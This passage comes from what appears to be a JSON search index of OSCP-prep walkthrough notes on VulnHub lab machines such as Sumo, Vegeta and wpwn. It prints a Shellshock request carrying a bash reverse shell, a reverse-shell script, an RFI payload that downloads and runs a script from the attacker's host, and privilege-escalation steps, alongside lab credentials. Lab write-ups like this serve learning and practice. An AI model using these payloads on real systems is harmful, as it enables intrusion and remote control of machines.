attack.</p>"},{"location":"OSCP-Prep/VulnHub/Solstice/#squid-httpd-proxy-46","title":"Squid httpd proxy 4.6","text":"<p>This is running on port 3128. We didn't see any webpages accessible from this port.</p>"},{"location":"OSCP-Prep/VulnHub/Solstice/#http-webservices","title":"http webservices","text":"<p>port 80, 8593, and 54787 have web services.</p> <p>Port 80 has version disclosure on the homepage</p> <p></p> <p>on port 54787 <code>nikto</code> found the following page</p> <pre><code>http://192.168.1.191:54787/project/index.php\n</code></pre> <p>This is a login page, we were able to guess the credentials username</p> <pre><code>admin\n</code></pre> <p>password</p> <pre><code>admin\n</code></pre> <p>at this point, we checked in with a walkthrough and it looks like we were possibly stuck in a rabbit hole</p> <pre><code>http://192.168.1.191:8593/index.php?book=\n</code></pre> <p>is vulnerable to LFI</p> <p>We poisoned the logs with some php, then got a shell as www-data</p> <p>we're able to see an interesting process running as root <code>/var/tmp/sv</code></p> <p>We modified the <code>index.php</code> page to contain a reverse shell then catch it with a netcat listener</p>"},{"location":"OSCP-Prep/VulnHub/Solstice/#root-flag","title":"Root flag","text":""},{"location":"OSCP-Prep/VulnHub/Sumo/","title":"Sumo","text":"<p>netdiscover found this box running on the following IP</p> <pre><code>192.168.1.104\n</code></pre> <p>nikto identified shellshock</p> <p></p> <p>We are able to get a reverse shell as <code>www-data</code> using the following web request.</p> <pre><code>GET /cgi-bin/test.sh HTTP/1.1\nHost: 192.168.1.104\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\nAccept: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.109/4444 0&gt;&amp;1\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n</code></pre> <p>linpeas and linux-exploit-suggester both identified dirtycow as a possible privesc avenue.</p> <p>I was struggling to get the exploit compiled, as I was getting an error:</p> <pre><code>gcc: error trying to exec 'cc1': execvp: No such file or directory\n</code></pre> <p>I turned to a walkthrough to see what I might be missing. And we found a way to fix the error:</p> <pre><code>PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/:/usr/bin;export PATH\n</code></pre> <p>We were able to get a root shell using dirtycow EDB-40839</p>"},{"location":"OSCP-Prep/VulnHub/Sumo/#root-flag","title":"Root flag","text":""},{"location":"OSCP-Prep/VulnHub/Vegeta/","title":"Vegeta","text":"<p>netdiscover finds this IP</p> <pre><code>192.168.1.113\n</code></pre> <p>autorecon finds port 22 and port 80.</p> <p>we found an entry in <code>robots.txt</code> and followed it</p> <p></p> <p></p> <p></p> <p>This brings us to a page with some encoded string in an HTML comment. We couldn't decode this to anything useful.</p> <p>Looked at a walkthrough, which finds <code>/bulba/</code></p> <p>There is a .wav file which has a morse code encoded message.</p> <pre><code>trunks\n</code></pre> <pre><code>u$3r\n</code></pre> <p>we should be able to log in with</p> <pre><code>ssh trunks@192.168.1.113\n</code></pre> <p>we are owner of the <code>/etc/passwd</code> file and if we look at the <code>history</code> we see a command that adds a new user <code>Tom</code> with root permissions. We run the command, and log into Tom's account with</p> <pre><code>su Tom\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Vegeta/#root-flag","title":"Root flag","text":""},{"location":"OSCP-Prep/VulnHub/Y0usef/","title":"Y0usef","text":"<pre><code>192.168.1.104\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Y0usef/#ports","title":"Ports","text":"<pre><code>22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Ubuntu))\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Y0usef/#port-80","title":"Port 80","text":""},{"location":"OSCP-Prep/VulnHub/noontide/","title":"Noontide","text":""},{"location":"OSCP-Prep/VulnHub/noontide/#enumeration","title":"Enumeration","text":"<p>Netdiscover found the IP:</p> <pre><code>192.168.1.133\n</code></pre> <p>autorecon found 3 ports open: - 6667 - 6697 - 8067</p> <p>All 3 of these ports seem to be running <code>UnrealIRCd 3.2.8.1</code> and we were able to find a few exploits for this on searchsploit</p> <p></p> <p>We opted to use the metasploit module, and gained a shell as the user <code>server</code></p>"},{"location":"OSCP-Prep/VulnHub/noontide/#user-flag","title":"User flag","text":"<p>we ran through some enumeration, noticed <code>sudo</code> is not available on this machine. after exhausting all thinkable resources, we looked at a walkthrough, and found the username and password are <code>root:root</code> we just need to</p> <pre><code>su root\n</code></pre> <pre><code>root\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/noontide/#root-flag","title":"Root flag","text":""},{"location":"OSCP-Prep/VulnHub/oscp%20prep/","title":"OSCP prep","text":"<pre><code>22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))\n33060/tcp open  socks5  syn-ack ttl 64\n\n</code></pre> <p>dirbuster found <code>robots.txt</code> which leads to <code>secret.txt</code></p> <p>The content of secret.txt was a base64 encoded ssh key.</p> <p>The description mentions the only user on this box is oscp.</p> <p>log in as oscp:</p> <pre><code>ssh -i id_rsa oscp@192.168.1.133\n</code></pre> <p>The SUID bit was set on <code>/bin/bash</code>, GTFObins</p> <p></p> <p>also found some creds (probably won't need these though)</p> <p></p> <p>becoming root is as easy as</p> <pre><code>/bin/bash -p\n</code></pre> <p>I am root</p> <p></p> <p></p>"},{"location":"OSCP-Prep/VulnHub/wpwn/","title":"wpwn","text":"<p>netdiscover found this running on</p> <pre><code>192.168.1.178\n</code></pre> <p>a port scan revealed ports 22 and 80 were open.</p> <p>port 80 is hosting wordpress in <code>/wordpress/</code></p> <p>we ran wpscan, which found a vulnerable plugin: <code>Social Warfare 3.5.2</code></p> <p>By reading EDB-46794 we found an endpoint that has potential for RFI.</p> <p>We are able to get a shell by creating <code>shell.sh</code> with the following content:</p> <pre><code>#!/bin/bash\n/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.109/8080 0&gt;&amp;1\n\n</code></pre> <p>we then started a listener, and  hosted this <code>payload</code> for RFI</p> <pre><code>&lt;pre&gt;system('wget http://192.168.1.109:80/shell.sh &amp;&amp; /bin/bash shell.sh')&lt;/pre&gt;\n</code></pre> <p>this gives us shell as <code>www-data</code></p> <p>linpeas findings</p> <p>database</p> <pre><code>wordpress_db\n</code></pre> <p>db user</p> <pre><code>wp_user\n</code></pre> <p>db password</p> <pre><code>R3&amp;]vzhHmMn9,:-5\n</code></pre> <p>We were able to find the admin hash in the <code>wp_users</code> table on this db.</p> <p>We are able to login as <code>takis</code> using the DB password.</p> <pre><code>ssh takis@192.168.1.178\n</code></pre> <pre><code>R3&amp;]vzhHmMn9,:-5\n</code></pre> <p>takis is able to run any command with SUDO.</p> <p></p> <p>get root with</p> <pre><code>sudo su\n</code></pre> <p>we looked at a walkthrough to find the root flag:</p> <pre><code>find / root 2&gt;/dev/null | grep USB\n</code></pre> <p>leads us to <code>/usr/games/usb/root</code></p>"},{"location":"OSCP-Prep/VulnHub/wpwn/#root-flag","title":"Root flag","text":""}]}